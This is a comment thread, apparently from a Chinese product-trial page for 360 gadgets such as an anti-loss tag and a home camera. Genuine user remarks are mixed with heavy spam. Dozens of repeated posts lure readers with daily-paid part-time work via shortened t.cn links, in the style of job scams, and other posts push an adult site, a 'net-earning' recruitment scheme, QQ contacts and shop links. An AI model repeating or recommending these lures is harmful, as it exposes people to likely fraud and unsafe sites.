--【有散时间的亲】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
--【有散时间的 亲】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
-【有散时间的亲】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
-------【业余找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
-------【业余找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
那么有钱的公司还试用
还能在山寨点吗？古代的印刷术是不是该叫打印机啊？
我只想要行车记录仪那样的
-------【业余找 工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
------ -【业余找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
有你说的功能要多少钱
------ -【业余找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
------ -【业余找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
炫酷啊 这么屌，早点出来吧
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
真是帅呆了。
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
------ -【业余找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
------ -【业余找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
我想知道，这是干嘛的？
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
好东西，值得一用
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
------ -【业余找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工資每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
----- -【业余找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
----- -【业余找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
很帅，对于安卓手机的完美适配也是一大亮点，可以随心所欲，独立或配合使用，好东西期待中！！
我也想要一个。路上不用丢了
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
感谢支持！！！
感谢各位赏评支持！ 
看起来很叼 价格应该会更叼
好好好好好好！
求点赞，求精品啊。。
---- -【业余找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
希望可以有一个
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
感觉被选到会好难的样子
看你的头像是专业的？
看到还蛮厚的，带电池的错啊。再薄点就不错了。
不错，就是不知道在阳光下的效果怎么样。
太想得到的产品了 如果质量好的话简直是太棒了
不错不错,无限期待中.....
听名字用途单一啊。没什么实用性，不过还是蛮好看的。带回去玩玩也还不错
。。。再牛点就成变形金刚了
我们是专业做监控摄像机的
我们公司大把的 还需要试用吗？
不错，支持一个，
还可以 支持一下
很有科技感！
这个创意太神气了，如果能实现，我希望能与我分享！
放在我们幼儿园可以当个小型气象站！
我很喜欢奇虎360，我这个人有一点先入为主的观念，我使用360，,觉得好，就会毫无保留的认定喜欢，对于360的软件，产品也很喜欢，我也买的360随身wifi，都觉得很好用，用360安全卫士没中过病毒，对360也很信任，前面15期的奇酷试用，我觉得好可惜，没看到啊，我喜欢那个鸦鸦3d打印笔这是我第一次申请觉得很好的样子，喜欢
能赞助我们幼儿园小朋友一些吗？我们超喜欢！
值得一试。。。
期待中奖！ 欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲，要求经常在线，做推 广，视贡献给予上管理，新工会求发展，诚聘各公频专业人员入会常驻。免费会员有限请速占领席位，晚了全部收费！本频道优势，客户可以全屏下单，会员 可全屏接单，没有地区，班组，等级限制，欢迎入驻！推荐人：5组星 空
期待中奖！ 欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲，要求经常在线，做推 广，视贡献给予上管理，新工会求发展，诚聘各公频专业人员入会常驻。免费会员有限请速占领席位，晚了全部收费！本频道优势，客户可以全屏下单，会员 可全屏接单，没有地区，班组，等级限制，欢迎入驻！推荐人：5组星 空
真心有用这东东。
出国能用吗
在那里买得到啊
为什么不带通话功能
真心求试用
贴上360送的贴膜就看不到 360 LOGO了
很想拥有如此神器啊！为我这种丢三落四的人提供
他喜欢的是360送的保险。
好期待中奖\(^o^)/~，希望好运降临在我的身上，在这里说一句永远支持奇虎360.还有就是有需要不锈钢管，不锈钢板，白钢管，无缝管，镀锌管的朋友可以联系我qq458905457
如此可爱实用的神器，望您高抬贵手，赏一个！
期待中，望美女帅哥们赏一个！
期待中！！！
看你的名字随便取的吧还有那头像不是你本人吧还有你不喜欢360何必来这里做出如此SB的回复?但是看你的回复八成是小学生，你一个人的SB找来不必要的麻烦。没有360这些硬件哪有最安全的路由器和那些硬件.如果你认为360无用?你把所有360什么的都卸了1个月后看你的电脑和网络被入侵了没再看你的回复我明白了一个道理就是你是眼馋了吧想要的话自己订一个啊
360的产品越来越多了，能适用就是好产品。喜欢！！！
什么时候轮到我呀
什么时候轮到我呀
希望能尽快推出方便购买！
怎么没有带手腕上的图片呢？
想买一个  不知道好不好
我们家为老人用了一个美国的FOSCAM，为照看老人提供了不少方便，可使用任何电脑，手机，ipad随时看到老人的活动，听到老人的声音，非常好。相信360也可以有使用电脑，手机，ipad的功能。有了360的，就不一定使用美国的了。
大爱啊，太吊了，
小哥文采不错，前来支持！加油哦 
希望能能增加最重要的功能！云台控制！
想知道，一代的还能用多久？
膜拜！为了我能看到家里的宠物猫，我拼了！
期待360的这款产品 我也有别关注这个 我们公司要用 非常期待
我觉得应该支持一下360，毕竟使用360免费软件也有那么多年了
赏一个吧  帅哥美女
这个东西是充电的还是换电池呢？满电能用多久呢？我觉得这些参数还是很重要的，应该说明一下！
从理念上看，很是期待。
希望能抽到360家庭卫士，谢谢了！
您好，我们现在在淘宝上做在众筹活动，已经是我们的最优惠的价格了，ghost已经给您很大的优惠了，无论是从价格还是机器的性能方面，相信选择ghost您一定会满意的！
相当不错 会一直关注的  
功能很强大，几乎可以把家里的机顶盒给丢了
这次应该又没我~
赞赞赞！！！
中国梦很大，我的梦很现实，就是360卫士。谢谢！
好科技啊！期待~~
哇！！真心喜欢 了。。。。
看起来很腻害的样子哎！！！
现在淘宝里面有个众筹http://hi.taobao.com/market/hi/detail2014.php?spm=a215p.1192983.1997711523.17.PeQcSX&amp;id=1004，可别错过了哦，不然可是真没有这个价了！
国外产品价格比这个要高很多呢
常外出 可以更放心了
http://hi.taobao.com/market/hi/detail2014.php?spm=a215p.1192983.1997711523.17.PeQcSX&amp;id=1004
很不错的设计
高水平，神回复
您好，我们现在在淘宝上做众筹的活动，这个价格已经是最优惠的了，无论是在价格还是在性能方面，相信选择Ghost会让你满意的！
期待中,这个东西看起来小巧可爱，又实用呀
此产品需要和Rm系列产品联动。
您好，您可以在淘宝上购买，也可以在微店上购买！
好东西，让忘性大的人快速寻找遗忘的物品。
中签中签中签中签中签中签 
一直是360的脑残粉，这个东西真心不错，家里有老人或者孩子的话，可以非常的放心了。
太期待了！好强大！
真的那么贵啊？？？？
快来帮我找东西。。
期待中……
希望能抽到360家庭卫士，谢谢了！
希望能抽到360家庭卫士，谢谢了！
希望能抽到360家庭卫士，谢谢了！
希望能抽到360家庭卫士，谢谢了！
期待中。。。。。。。。
好多试用啊，争取中一发
翘首以盼。
关注360的最新高科技产品，期待试用~~
应该有吧!
期待  审核成功  
前卫、高大上。希望能够考虑阳光下、黑夜里等不同的使用环境，智能的改变投影的颜色；另外，使用者的肤色也是一个需要考虑的问题。
期待中！！
好！超喜欢
这个东西好啊。。。期待上市！！！
支持360免费到底！！
另外打个小广告，有做股票的可以加我QQ：2881139840
顶，没什么用的玩意。这不过就是个热熔枪而已嘛，以前硅胶棒的热熔枪就这么玩过。
这个确实实用
期待可以通过审核
鼎力支持哦！
看起来不错，点赞!!!!!!!
看起来不错，点赞!!!!!!!
可以贴在另一半身上，捉~奸
希望这个功能能够实现在小孩和父母之间，还希望能够实现在车子行业中。
支持360发展，期待360防丢卫士可以早点上市
下次带投影仪出门再也不用担心脖子溜号了！呵呵！
支持，支持，期待
来点实用的把，试问这个不能试用吗？我想现在的穿戴设备价格都很高啊，我在想这款应该在120美金最少了吧
带手腕上不好拍照
这个人专门试用的，好多她的试用自拍
这里不错，参考一下http://item.taobao.com/item.htm?id=40188974970
已经提交申请，也写了好多关于产品的个人看法，希望能审核成功
开发者脑子进水了吧？哦漏！！！！！！！
360杀毒软件开创了中国免费杀毒的新纪元，鼎力支持，做成全国最大最强的杀毒公司。
好的产品需要好的客户
希望能成功  都投了很多次了
360是最成功的，支持
电池如何更换呢？
期待360更加完美更好用！
申请了这么多，怎么还没我................5555555555555555555555555555
看这个样子貌似挺牛逼
太有爱了。
期待ing
听人性化的 哈哈
希望能成功   ，绝对的支持
期待对性能和参数有一个系统的评价。
报告怎么弄，给360发邮件？？？
报告怎么弄《给360发邮件？？
 我好喜欢这个东西
对我这中丢三落四的人，这是个神器，无形中就会产生各种情况下的试验
360产品好。我支持。
如果360防丢卫士警报做的到位在市场一定会火！！！！
你这个报告对得起我们这些等待的亲们吗？不及格，重写
看上去挺不错的 就是不知道价格是多少
奇酷网最近推出的东西都蛮有新意的，实用度也挺高，价钱还可以接受，可以说真心实意为用户着想吧，只是这试用从来没有选中过我，为什么？免费试用只是为了赚取眼球吗？
关键是我家8M的宽带上传有压力吗？
不要没有啊
新产品，创新啊
希望中了！！！！
帅爆了！！！
一直都是360的忠实用户 希望这次能申请成功 期待360做的更好 给大家更多的惊喜和期待
真好!!!!!!!
 男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
恩 不错 不错!
中与不中，还是发哈言。。。
不知道可不可以买到~~~
已习惯不中
就是，等到花儿都谢了
360新科技，新创意，创新就能生存，改革才能稳赢。
酷 毙  了
好期待哦！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
创意生发奇迹
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
永远支持360！！！！
360产品好。我支持
东西不错，但感觉不会很便宜
期待！！！！！！！！！！！！！！！！！！！！！
期待！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
好期待啊啊啊啊啊
360产品好。我支持 
能耗高吗？耐用吗？维修费用高吗?
强大的360啊。。。越来来牛x了。
大爱360
这喵实在太贱了
拜托上天眷顾我一下吧
拭目以待！
非常时尚、实用，打算去买一直玩玩。
我家就是个台式机，照样用，网速很快啊
选我吧，我是专业试用者。
牛逼  期待通过 ！！！
360就是吊
中签中签中签啊老天保佑
从来没被选中个 但一直在努力
360这个平台我信任，支持360，提点意见，360平台能否创建一个电脑预防被盗跟踪软件，谢谢，
360产品好。
很不错的产品，希望可以试用。
多少钱呢？       
很酷！！！可以买一个送人！！
一定要中签啊
不错，太适合我了，呵呵
强大的360，希望能开发出更多的产品。
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
创意不错。。。。  不知道正式出产品之后价格是否亲民啊
好像很腻害的啊！！！！！！！
不知道详细配置如何
价钱是多少，360产品好，我支持 。
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
360越做越好了，出了一个这么好的防丢卫士，相信肯定会受更多人的青睐。
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
每天都很忙碌  随着年龄的增长 记忆力和视力都出现问题了 丢三落四的 这款神器正和我意 拥有它在不会翻箱倒柜的找钥匙了  呵呵 这神器太吸引我了 值得拥有
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
360路由器，非抢即得。
看上去还真是不错啊，真心想买个旅游外出的时候应该可以秒杀天气预报吧！
不错，很是不错。。。
想要一个，很实用
这就算评测吗
我的在路上
假如能调整投射方向呢？
我平时也是很丢三落四的，因为这个毛病没少吃亏，这个神奇很吸引我的眼球。360太棒了 科技改变生活啊
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
卖东西的滚蛋 
这样挂在小孩身上在商场应该就不会走失了吧!只是不知有效范围多大！
手机容易丢失 用来跟踪
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
一直支持360.希望越做越好
求中签，加油360
真的很厉害的模样。功能实用强大
给老年痴呆的老人用上，不怕他走丢了 希望功耗小点，充电一次，管上一个月就好了。
好东西值得拥有!
求中签~加油360
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
这么好的东东，来一个
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
很有创意，喜欢，支持！~
我喜欢~~
希望360越来越强大，希望绿叶常青、、、
真希望能要到，这样老妈就不会丢三落四了。。。。希望把车钥匙落在餐厅都不知道的事情不会发生
很喜欢这款臂式血压计的设计，简洁大气，很值得我去学习
在家里种上一块地的白菜
真心好产品啊，我没有申请上，全国被拐卖的儿童非常多，我每次看到有关的报道我的内心就非常害怕，孩子丢了是多么可怕的一件事啊，孩子受罪，大家伤心，要是孩子们戴上这样的表，大人们时时刻刻能找到孩子，我们这些上班的家人，都会安心一些。希望360多出些这样的好产品！！！我替天下的父母们谢谢你们了。
我想问下真的是免费不要钱的吗？
是不是免费的
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
用一元硬币打开电池盖就可以更换电池了！亲
领不到的，，，，，都散了吧
还是360好啊 
